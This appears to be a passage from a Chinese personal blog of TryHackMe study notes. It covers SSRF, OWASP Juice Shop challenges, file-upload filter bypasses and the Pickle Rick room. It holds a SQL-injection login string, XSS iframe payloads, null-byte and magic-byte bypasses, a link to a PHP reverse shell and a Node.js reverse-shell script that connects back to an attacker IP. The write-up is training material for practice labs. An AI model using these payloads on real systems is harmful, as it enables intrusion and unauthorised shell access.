<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142200295.png" srcset="/img/loading.gif" lazyload alt="image-20240314220006071"></p>
<p>就是这里，server我们可以控制，可以修改成我们监听的ip地址加端口</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142203248.png" srcset="/img/loading.gif" lazyload alt="image-20240314220315967"></p>
<p>然后我们还可以利用这个去访问localhost/admin的信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210976.png" srcset="/img/loading.gif" lazyload alt="image-20240314221015887"></p>
<p>然后会把admin下的文件给下载下来，查看即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210638.png" srcset="/img/loading.gif" lazyload alt="image-20240314221054350"></p>
<h3 id="OWASP-Juice-Shop"><a href="#OWASP-Juice-Shop" class="headerlink" title="OWASP Juice Shop"></a>OWASP Juice Shop</h3><p>Inject the juice</p>
<p>登录管理员用户 万能密码进行登录 在邮箱那里 ‘or 1=1 – 然后密码随便填 </p>
<p>然后如果是bender用户登录的话，思路也是一样的</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403152101665.png" srcset="/img/loading.gif" lazyload alt="image-20240315210145357"></p>
<p>Who broke my lock?!</p>
<p>上面的是解决登录问题，现在这个主要是解决密码的问题，我们在上面已经可以登录管理员的账号了，但是密码我们并不知道。</p>
<p>我们可以尝试进行密码的爆破。</p>
<p>实例:</p>
<p>1.获取管理员的密码，对密码进行爆破</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403170016479.png" srcset="/img/loading.gif" lazyload alt="image-20240317001650078"></p>
<p>2.重置用户的密码:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181933452.png" srcset="/img/loading.gif" lazyload alt="image-20240318193331214"></p>
<p>主要是根据名字和喜好进行的一个猜测，所以以后设置问题的时候还是严谨一点。</p>
<p>根据前面的星际穿越和名字进行一个搜索，在google中可以查到相关信息。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181939380.png" srcset="/img/loading.gif" lazyload alt="image-20240318193942179"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181940791.png" srcset="/img/loading.gif" lazyload alt="image-20240318194003630"></p>
<p>知道了信息就可以进行重置密码了。</p>
<p> AH! Don’t look!</p>
<p>信息泄露。</p>
<p>实例:</p>
<p>在关于我们那里，有一个绿色的链接，是一个下载md文件的链接<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182045122.png" srcset="/img/loading.gif" lazyload alt="image-20240318204508963"></p>
<p>然后我们访问ftp目录，看是否存在敏感信息。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182046562.png" srcset="/img/loading.gif" lazyload alt="image-20240318204602306"></p>
<p>看起来是存在的，可以下载下来看看里面都是什么。</p>
<p>但是当我们下载非md和pdf的文件时，就会出现403，这个时候我们可以利用%00进行绕过。</p>
<p>%00是一个NULL终止符，告诉服务器在这个地方进行停止，然后后面的值就是空的。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182142082.png" srcset="/img/loading.gif" lazyload alt="image-20240318214233803"></p>
<p>Who’s flying this thing?</p>
<p>主要是越权，分为水平越权(当用户可以执行具有<strong>相同</strong>权限级别的其他用户的操作或访问数据时发生。)还有一个是垂直越权(当用户可以执行具有<strong>更高</strong>权限级别的其他用户的操作或访问数据时发生。)</p>
<p><img src="https://i.imgur.com/bJ9WKY4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>实例:</p>
<p>我们在前端里面发现一个administration,然后尝试去访问发现并不得行，然后我们去登录管理员用户，再去访问这个路径就可以了。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182201934.png" srcset="/img/loading.gif" lazyload alt="image-20240318220157631"></p>
<p>Where did that come from?</p>
<p>主要是关于xss的相关内容。</p>
<p>xss分为三类，分别是DOM型xss,反射型xss，存储型xss.</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201808117.png" srcset="/img/loading.gif" lazyload alt="image-20240320180845973"></p>
<p>实例:</p>
<p>DOM型的xss</p>
<p>在搜索框那里可以进行DOM型的xss </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201815266.png" srcset="/img/loading.gif" lazyload alt="image-20240320181546019"></p>
<p>存储型xss</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201849455.png" srcset="/img/loading.gif" lazyload alt="image-20240320184941297"></p>
<p>反射型xss:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201859281.png" srcset="/img/loading.gif" lazyload alt="image-20240320185942012"></p>
<p>注意一下这里包裹xss的是``</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;iframe src=<span class="hljs-string">&quot;javascript:alert(`xss`)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<h3 id="Upload-Vulnerabilities"><a href="#Upload-Vulnerabilities" class="headerlink" title="Upload Vulnerabilities"></a>Upload Vulnerabilities</h3><p>首先做一些前置工作，在/etc/hosts 下添加一些信息。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ip    overwrite<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> shell<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> java<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> annex<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> magic<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> jewel<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> demo<span class="hljs-selector-class">.uploadvulns</span>.thm<br></code></pre></td></tr></table></figure>

<p>这个房间主要是介绍一些文件上传的利用点。</p>
<p>Overwriting Existing Files(覆盖文件)</p>
<p>当我们成功上传上去一个文件时，其文件名会被更改,以防止文件覆盖。文件名有时可能是随机的，或者是当前上传的时间和日期添加到文件末尾，或者是当上传一个相同文件名时，直接返回错误。</p>
<p>实例:</p>
<p>我们查看网页源代码，知道图片名字是mountains.jpg，然后我们再去上传一个同名字的图片，就会造成一个文件覆盖。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212013267.png" srcset="/img/loading.gif" lazyload alt="image-20240321201326902"></p>
<p>Remote Code Execution(远程代码执行)</p>
<p>就是往服务端上传一个一句话木马,或者是反弹shell的命令.</p>
<p>实例:</p>
<p>首先通过dirsearch扫目录，可以看到上传路径。</p>
<p>然后上传进去一个一句话木马就行了。</p>
<p>Filtering</p>
<p>上面都是没过滤的，下面这个讲的是一些过滤方法。</p>
<p>大体的分为两大类:</p>
<p>1.客户端的一个过滤，这里的话是在用户浏览器的一个过滤，相对来说是很好绕过的，禁用js即可。</p>
<p>2.另外一个是在服务端的一个过滤，这里的绕过就需要考虑很多了，我们是不知道服务端所执行的代码，所以我们需要进行不断的尝试绕过。</p>
<p>下面来具体介绍一下过滤的方法:</p>
<p>1.设置白名单(即只允许我们定义的文件上传)和黑名单(不允许我们定义的文件上传)。MS Windows 仍然使用它们来识别文件类型</p>
<p>2.文件类型筛选。检查MIME的值是否符合图片类型的。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212106148.png" srcset="/img/loading.gif" lazyload alt="image-20240321210633022"></p>
<p>还有就是不同的图片，前八个字节是固定的，通常uinx通过这个来检查文件是否符合条件。</p>
<p>例如:png图片的前八个字节是 89 50 4E 47 0D 0A 1A 0A</p>
<p>3.文件大小限制，就是限制上传文件的大小，防止上传大的文件造成服务器资源匮乏。</p>
<p>4.对文件名的过滤，检查文件名是否重复以及是否存在一些不合法的字符。</p>
<p>5.文件内容的过滤。</p>
<p>反向shell文件:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p>
<p>实例:</p>
<p>这个实例thm给了四种，我只知道其中的三种，最后一种挺有意思的。</p>
<ol>
<li><em>在浏览器中关闭 Javascript</em> - 如果网站不需要 Javascript 来提供基本功能，这将起作用。如果完全关闭 Javascript 会阻止网站运行，那么其他方法之一会更可取;否则，这可能是完全绕过客户端筛选器的有效方法。</li>
<li><em>拦截并修改传入页面。</em> 使用 Burpsuite，我们可以拦截传入的网页并在 Javascript 过滤器有机会运行之前将其剥离。</li>
<li><em>拦截并修改文件上传。</em>如果前面的方法在加载网页<em>之前</em>起作用，则此方法允许网页正常加载，但在文件已通过（并被筛选器接受）后拦截文件上传。同样，我们将介绍在任务过程中使用此方法的过程。</li>
<li><em>将文件直接发送到上传点。</em>为什么要使用带有过滤器的网页，当您可以使用诸如 ？将数据直接发布到包含用于处理文件上传的代码的页面是完全绕过客户端筛选器的另一种有效方法。</li>
</ol>
<p>利用curl语句进行上传。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;submit:&lt;value&gt;&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot;</span> &lt;site&gt;<br></code></pre></td></tr></table></figure>

<p>这里给的很清楚了，就不做演示了。</p>
<p> Bypassing Server-Side Filtering: File Extensions</p>
<p>从这里开始就是绕过服务端的了。</p>
<p>绕过的方式比较杂一点，黑名单的话就是不断的进行尝试，直到我们可以上传上去我们构造的shell文件。</p>
<p>实例:</p>
<p>这里thm给的上传环境还挺有意思的。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png" srcset="/img/loading.gif" lazyload alt="image-20240326195715756"></p>
<p>select 是选择上传的文件</p>
<p>upload是进行上传</p>
<p>chosen 输出所选文件的名称</p>
<p>上传php5的后缀可以上传成功 然后利用dirsearch可以把文件存放的路径给爆破出来。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png" srcset="/img/loading.gif" lazyload alt="image-20240326202219319"></p>
<p>Bypassing Server-Side Filtering: Magic Numbers</p>
<p>这个的话就是对文件头的一个检查 加一个GIF89a即可绕过。</p>
<p>挑战:</p>
<p>首先我们进去之后发现是一个nodejs的服务，这时候我们就不能用php了，可以去网上找一个反弹shell的脚本。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;net&quot;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>),<br>    sh = cp.<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []);<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(port, <span class="hljs-string">&quot;此处替换为攻击端IP&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span>;<br>&#125;)();<br></code></pre></td></tr></table></figure>

<p>通过扫描后台可以得到一些路径</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png" srcset="/img/loading.gif" lazyload alt="image-20240326210524742"></p>
<p>通过查看网页源代码:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png" srcset="/img/loading.gif" lazyload alt="image-20240326210645953"></p>
<p>找到相关的信息。</p>
<p>然后可以看到它过滤的一些信息点。文件大小，文件名(只让上传jpg的文件)，以及文件头的信息。</p>
<p>所以我们首先先构造一下这个js的反弹shell的脚本，然后再进行修改。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.使用hexeditor xx.<span class="hljs-keyword">js </span>进行修改文件头 <br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png" srcset="/img/loading.gif" lazyload alt="image-20240326213544023"></p>
<p>然后修改后缀，最后查看一下大小是否符合</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png" srcset="/img/loading.gif" lazyload alt="image-20240326213846172"></p>
<p>然后上传上去，接下来就是找上传后的路径了。</p>
<p>因为我们上传的是jpg图片，然后我们可以找到jpg图片所存储的位置。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png" srcset="/img/loading.gif" lazyload alt="image-20240326214355942"></p>
<p>在/content/目录下</p>
<p>可以利用ffuf进行暴力破解，然后就可以得到我们上传进去的文件名了</p>
<p>然后去访问等待反弹shell即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png" srcset="/img/loading.gif" lazyload alt="image-20240326220433985"></p>
<p>记得上传文件时进行抓包，修改一下里面的值</p>
<p>把那个base64编码的替换成自己的js反弹shell经过base64编码后的值</p>
<p>要不然的话这个shell文件就不会触发</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png" srcset="/img/loading.gif" lazyload alt="image-20240326222858465"></p>
<h3 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h3><p>首先扫描后台，发现login.php 还有robots.txt  查看网页源代码发现用户名，然后robots.txt里面的是登录密码。</p>
<p>登录进去之后可以执行系统命令，但是cat被过滤了，所以我们使用tac来查看Sup3rS3cretPickl3Ingred.txt的内容</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png" srcset="/img/loading.gif" lazyload alt="image-20240327104354509"></p>
<p>然后查看后面的页面时，发现无权限访问，然后whoami看了一下，发现并不是root用户，猜测这里要进行提权。</p>
<p>第二部分:</p>
<p>试了一下sudo whoami 直接就是root用户了</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png" srcset="/img/loading.gif" lazyload alt="image-20240327110239492"></p>
<p>我们在/home目录下找到了rick</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png" srcset="/img/loading.gif" lazyload alt="image-20240327110910558"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png" srcset="/img/loading.gif" lazyload alt="image-20240327112321022"></p>
<p>记得文件名加引号</p>
<p>第三部分:</p>
<p>在/root目录里面</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png" srcset="/img/loading.gif" lazyload alt="image-20240327113843143"></p>
<p>最后利用sudo tac /root/3rd.txt 查看即可</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/tryhackme%E5%AD%A6%E4%B9%A0/" class="category-chain-item">tryhackme学习</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/tryhackme/" class="print-no-link">#tryhackme</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Web Fundamentals</div>
      <div>http://example.com/2024/03/08/Web Fundamentals/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>FSRM</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月8日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年3月27日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/27/DC-1/" title="DC-1">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">DC-1</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/25/ezunserialize/" title="ez_unserialize">
                        <span class="hidden-mobile">ez_unserialize</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"uIHnq7AMZzxGr67001Hi4rIt-gzGzoHsz","appKey":"dXTOT6Pscxry6haYWYds2nMd","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
